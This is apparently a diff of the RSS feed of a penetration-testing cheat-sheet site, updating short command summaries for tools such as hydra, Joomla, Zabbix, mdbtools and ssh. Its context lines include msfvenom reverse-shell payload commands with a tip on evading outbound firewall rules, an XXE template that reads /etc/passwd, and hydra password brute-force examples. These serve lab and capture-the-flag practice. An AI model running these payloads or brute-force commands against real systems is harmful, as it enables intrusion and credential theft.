@@ -40,7 +40,7 @@
       <link>https://tldrbins.github.io/compressed_files/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/compressed_files/</guid>
-      <description>zip # zip a file zip file.zip file # zip a folder zip -r folder.zip folder/ # unzip unzip file.zip Note: Always put the zip file inside a new folder before unzip&#xA;tar.gz # Compress a file tar -cvzf file.tar.gz file # Compress a folder tar -cvzf folder.tar.gz folder/ # Extract tar -xvzf file.tar.gz Note: Always put the zip file inside a new folder before Extract&#xA;gz # Compress file, and keep the original file gzip -k -r file # Compress all files individually inside a folder, and keep original files gzip -k -r folder/ # Extract gunzip file.</description>
+      <description>Hint: Always put the zip file inside a new folder before unzip&#xA;zip # zip a file zip file.zip file # zip a folder zip -r folder.zip folder/ # unzip unzip file.zip tar.gz # Compress a file tar -cvzf file.tar.gz file # Compress a folder tar -cvzf folder.tar.gz folder/ # Extract tar -xvzf file.tar.gz gz # Compress file, and keep the original file gzip -k -r file # Compress all files individually inside a folder, and keep original files gzip -k -r folder/ # Extract gunzip file.</description>
     </item>
     <item>
       <title>Connection from Public Internet</title>
@@ -152,7 +152,7 @@
       <link>https://tldrbins.github.io/ftp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ftp/</guid>
-      <description> Basic # Connect ftp 10.10.11.10 +-------------------+ |Anonymous login | +-------------------+ |Username: anonymous| |Password: (empty) | +-------------------+ # List ls # Download get filename # Upload put filename # Exit quit </description>
+      <description> Basic # Connect ftp 10.10.11.10 +-------------------+ |Anonymous login | +-------------------+ |Username: anonymous| |Password: (empty) | +-------------------+ # List ls # Switch to binary transfer mode bin # Download get filename # Upload put filename # Exit quit </description>
     </item>
     <item>
       <title>git</title>
@@ -173,7 +173,7 @@
       <link>https://tldrbins.github.io/hydra/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/hydra/</guid>
-      <description> Hydra Web Page Login Form hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt https-post-form &amp;#34;/login.php:username=admin&amp;amp;password=^PASS^&amp;amp;remember=yes:Incorrect password&amp;#34; +-----------------------------------------+ |-l : username | |-P : wordlist | |https-post-form : service | |/login.php : action | |^PASS^ : payload indicator | |Incorrect password : login failure string| +-----------------------------------------+ SSH with user:password list hydra -C creds.txt ssh://10.10.11.10 </description>
+      <description>Hydra HTTP basic auth hydra -L usernames -P passwords -s 8080 -f example.com http-get / +-----------------------------------------+ |-s : port | |-L : usernames file | |-P : passwords file | |-f : exit when a login/pass pair is found| +-----------------------------------------+ Web Page Login Form hydra 10.10.11.10 -l admin -P /usr/share/seclists/Passwords/500-worst-passwords.txt https-post-form &amp;#34;/login.php:username=admin&amp;amp;password=^PASS^&amp;amp;remember=yes:Incorrect password&amp;#34; +-----------------------------------------+ |-l : username | |-P : wordlist | |https-post-form : service | |/login.php : action | |^PASS^ : payload indicator | |Incorrect password : login failure string| +-----------------------------------------+ SSH with user:password list hydra -C creds.</description>
     </item>
     <item>
       <title>IIS</title>
@@ -195,6 +195,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/java_envionment/</guid>
       <description> Set JDK Environment sudo update-alternatives --config java sudo update-alternatives --config javac </description>
+    </item>
+    <item>
+      <title>Joomla</title>
+      <link>https://tldrbins.github.io/joomla/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/joomla/</guid>
+      <description> Check Version curl -s http://10.10.11.10/administrator/manifests/files/joomla.xml | head Admin Panel http://10.10.11.10/administrator </description>
     </item>
     <item>
       <title>Keepass</title>
@@ -265,6 +272,20 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
       <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe # Stageless msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note: These will be flagged by AV Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
+    </item>
+    <item>
+      <title>Microsoft Access Database</title>
+      <link>https://tldrbins.github.io/microsoft_access_database/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/microsoft_access_database/</guid>
+      <description> Tool sudo apt install mdbtools Basic # Show all tables mdb-tables database.mdb # Show tables with data mdb-tables database.mdb | tr &amp;#39; &amp;#39; &amp;#39;\n&amp;#39; | grep . | while read table; do lines=$(mdb-export database.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo &amp;#34;$table: $lines&amp;#34;; fi; done # Dump data from table mdb-export database.mdb table_name </description>
+    </item>
+    <item>
+      <title>Microsoft Oulook Email Folder</title>
+      <link>https://tldrbins.github.io/microsoft_outlook/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/microsoft_outlook/</guid>
+      <description> Open .pst file Tool sudo apt install readpst Basic # Convert to mbox format readpst emails.pst # Open .mbox (plaintext) cat emails.mbox Read many emails # Use mutt mutt -Rf emails.mbox +------------------------------------+ |Note: Answer No to create /root/Mail| | | |Arrow : Move to the email | |Enter : View email | |q : back | |q again : quit | +------------------------------------+ </description>
     </item>
     <item>
       <title>MongoDB General</title>
@@ -488,7 +509,7 @@
       <link>https://tldrbins.github.io/ssh/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/ssh/</guid>
-      <description>Check SSH version openssh-server (ubuntu) openssh-server (debian)&#xA;Config Location /etc/ssh/sshd_config Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Generate no passphrase SSH key from encrypted key openssl rsa -in id_rsa_encrypted -out ./id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo &amp;#39;&amp;lt;id_rsa.pub&amp;gt;&amp;#39; &amp;gt;&amp;gt; /home/user/.ssh/authorized_keys Connect to SSH with id_rsa ssh user@10.10.11.10 -i id_rsa # Fix: no matching host key type found.</description>
+      <description>Check SSH version openssh-server (ubuntu) openssh-server (debian)&#xA;Config Location /etc/ssh/sshd_config # Grep contents grep -Ev &amp;#34;^#&amp;#34; /etc/ssh/sshd_config | grep . Generate SSH Key ssh-keygen #Set filename, leave passphase blank ./id_rsa #After Creation chmod 600 id_rsa Check Public Key ssh-keygen -l -f id_rsa Generate no passphrase SSH key from encrypted key openssl rsa -in id_rsa_encrypted -out ./id_rsa Add SSH Access to Target cat id_rsa.pub #Copy and Paste to Target echo &amp;#39;&amp;lt;id_rsa.</description>
     </item>
     <item>
       <title>SSL</title>
@@ -580,6 +601,13 @@
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/xxe/</guid>
       <description> XXE Template &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;!DOCTYPE foo [&amp;lt;!ENTITY data SYSTEM &amp;#34;/etc/passwd&amp;#34;&amp;gt;]&amp;gt; &amp;lt;product&amp;gt; &amp;lt;id&amp;gt;&amp;amp;data;&amp;lt;/id&amp;gt; &amp;lt;price&amp;gt;&amp;lt;/price&amp;gt; &amp;lt;/product&amp;gt; </description>
+    </item>
+    <item>
+      <title>Zabbix</title>
+      <link>https://tldrbins.github.io/zabbix/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/zabbix/</guid>
+      <description>Zabbix API General # Auth with cred curl http://10.10.11.10/zabbix/api_jsonrpc.php -H &amp;#34;Content-Type: application/json-rpc&amp;#34; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;, &amp;#34;method&amp;#34;:&amp;#34;user.login&amp;#34;, &amp;#34;id&amp;#34;:1, &amp;#34;auth&amp;#34;:null, &amp;#34;params&amp;#34;:{&amp;#34;user&amp;#34;: &amp;#34;user&amp;#34;, &amp;#34;password&amp;#34;: &amp;#34;password&amp;#34;}}&amp;#39; # Get users curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H &amp;#34;Content-Type: application/json-rpc&amp;#34; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;, &amp;#34;method&amp;#34;:&amp;#34;user.get&amp;#34;, &amp;#34;id&amp;#34;:1, &amp;#34;auth&amp;#34;:&amp;#34;abcdefgh1234567890ijklmnopqrstuv&amp;#34;, &amp;#34;params&amp;#34;:{&amp;#34;output&amp;#34;: &amp;#34;extend&amp;#34;}}&amp;#39; | jq . # Get hosts curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H &amp;#34;Content-Type: application/json-rpc&amp;#34; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.0&amp;#34;, &amp;#34;method&amp;#34;:&amp;#34;host.get&amp;#34;, &amp;#34;id&amp;#34;:1, &amp;#34;auth&amp;#34;:&amp;#34;abcdefgh1234567890ijklmnopqrstuv&amp;#34;, &amp;#34;params&amp;#34;:{}}&amp;#39; | jq . # Get user group info curl -s http://10.10.11.10/zabbix/api_jsonrpc.php -H &amp;#34;Content-Type: application/json-rpc&amp;#34; -d &amp;#39;{&amp;#34;jsonrpc&amp;#34;:&amp;#34;2.</description>
     </item>
   </channel>
 </rss>
